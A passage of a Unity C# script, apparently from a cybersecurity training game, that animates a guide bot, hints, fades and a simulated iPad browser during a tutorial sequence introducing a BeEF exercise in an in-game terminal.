    {
        tween.setDelay(delay);
    }
}

public void FirstTimeGuider()
{
     
LeanTween.scale(guider, new Vector3(6, 6, 1), 0.6f)
    .setDelay(0.5f)
    .setEase(LeanTweenType.easeOutQuart)
    .setOnComplete(() =>
    {
        LeanTween.scale(chatbubble, new Vector3(1, 1, 1), 0.5f)
            .setEase(LeanTweenType.easeOutQuart)
            .setOnComplete(() =>
            {
                guiderBot.StartDialogueRange(37, 40);
            });
    });

LeanTween.scale(Xbutton, new Vector3(1, 1, 1), 0.3f)
    .setDelay(2.5f)
    .setEase(LeanTweenType.easeOutQuart);

}

//show hint and play audio function
public void ShowHint(float positionX , float positionY){

    RectTransform hintRect = playerHint.GetComponent<RectTransform>();
     hintRect.anchoredPosition = new Vector2(positionX, positionY);

     SoundManager.Play("playerHint");
      LeanTween.scale(playerHint, new Vector3(1, 1, 0), 0.3f)
                        .setEase(LeanTweenType.easeInOutBack);
     
}

public void ShowLongHint(float positionX , float positionY){

    RectTransform hintRect = LongHint.GetComponent<RectTransform>();
     hintRect.anchoredPosition = new Vector2(positionX, positionY);

     SoundManager.Play("playerHint");
    LeanTween.scale(LongHint, new Vector3(3f, 0.5f, 0f), 0.3f)
                        .setEase(LeanTweenType.easeInOutBack);
     
}

private IEnumerator ShowHintAfterDelay(float delay, float positionX, float positionY)
{
    yield return new WaitForSeconds(delay);
    ShowHint(positionX, positionY);
}

private IEnumerator StartDialogueRangeDelayedWithCallback(int start, int end, float delay, System.Action onComplete)
{
    yield return new WaitForSeconds(delay);
    guiderBot.StartDialogueRange(start, end, onComplete);
}

private IEnumerator RunBeEfIntroSequence()
{
        LoadFirefoxPage(IpadHomePage);

    yield return new WaitForSecondsRealtime(1.0f);
    yield return StartCoroutine(PlayDialogueRangeAndWait(51, 51));

    yield return StartCoroutine(MoveIpadAndWait(new Vector3(310.1874f, 97.8f, 0f), 1f));

    LoadFirefoxPage(BankFeedBackPage);
    ActivatePanel1();
    yield return StartCoroutine(PlayDialogueRangeAndWait(52, 52));

    yield return StartCoroutine(PlayDialogueRangeAndWait(53, 53));
    ShowHint(-243.2f, 62.9f);
}

private IEnumerator PlayDialogueRangeAndWait(int start, int end)
{
    bool finished = false;
    guiderBot.StartDialogueRange(start, end, () => finished = true);
    while (!finished)
    {
        yield return null;
    }
}

private IEnumerator MoveIpadAndWait(Vector3 targetPosition, float duration)
{
    if (pixelIpad == null)
    {
        yield break;
    }

    bool finished = false;
    RectTransform ipadRect = pixelIpad.GetComponent<RectTransform>();
    if (ipadRect != null)
    {
        // UI objects should be moved in local/canvas space.
        LeanTween.moveLocal(pixelIpad, targetPosition, duration)
            .setEase(LeanTweenType.easeOutQuad)
            .setOnComplete(() => finished = true);
    }
    else
    {
        // Non-UI objects use world space movement.
        LeanTween.move(pixelIpad, targetPosition, duration)
            .setEase(LeanTweenType.easeOutQuad)
            .setOnComplete(() => finished = true);
    }

    while (!finished)
    {
        yield return null;
    }
}

 IEnumerator FadeIn(CanvasGroup canvasGroup)
{
    for (float a = 0; a <= 1; a += Time.unscaledDeltaTime * 3)
    {
        canvasGroup.alpha = a;
        yield return null;
    }
}

IEnumerator FadeOut(CanvasGroup canvasGroup)
    {
        for (float a = 1; a>= 0 ; a -= Time.unscaledDeltaTime * 3)
        {
            canvasGroup.alpha = a;
          yield return null;

        }
           canvasGroup.alpha = 0f;
    }

IEnumerator FadeInWaitAndFadeOut(CanvasGroup canvasGroup, float waitTime = 3f)
{
    yield return new WaitForSeconds(5f);  
    SoundManager.Play("brainTime");
                brainTextContainer.gameObject.SetActive(true);

    CenterBrainCanvas();
    yield return StartCoroutine(FadeIn(canvasGroup));
    ApplyBrainTimeUiTransition();
    yield return new WaitForSeconds(waitTime);

    yield return StartCoroutine(FadeOut(canvasGroup));
}

private void ApplyBrainTimeUiTransition()
{
    if (lockImage != null)
    {
        lockImage.SetActive(true);
    }

    if (terminalCanvas != null)
    {
        terminalCanvas.SetActive(true);
    }

 

    if (!TryResolveBrainText())
    {
        return;
    }

    brainText.SetActive(true);
    brainTextCanvas = brainText.GetComponent<CanvasGroup>();
    brainTextTMP = brainText.GetComponent<TMP_Text>();

    if (brainTextTMP != null)
    {
        brainTextTMP.text = "Run beef in Terminal to deduct 10s off the clock";
    }

    if (brainTextCanvas != null)
    {
        brainTextCanvas.alpha = 0f;
        StartCoroutine(FadeIn(brainTextCanvas));
    }

    ScrollOutputToTop();
}





IEnumerator FadeOutAndDisable(CanvasGroup canvasGroup)
{
    yield return StartCoroutine(FadeOut(canvasGroup));
    canvasGroup.gameObject.SetActive(false);
}

private void ScrollOutputToTop()
{
    if (outputScrollRect == null && UpdateText != null)
    {
        outputScrollRect = UpdateText.GetComponentInParent<ScrollRect>();
    }

    if (outputScrollRect == null)
    {
        return;
    }

    Canvas.ForceUpdateCanvases();
    outputScrollRect.verticalNormalizedPosition = 1f;
}

public void closeGuiderBot()
    {
        float targetX = hasGuiderInitialAnchoredPosition ? guiderInitialAnchoredPosition.x : 290f;
        TweenGuiderAnchoredX(targetX, 0.3f, 2f);
        LeanTween.scale(guider, new Vector3(0, 0, 1), 0.6f)
        .setDelay(2f)
    .setEase(LeanTweenType.easeOutQuart);
    }

}
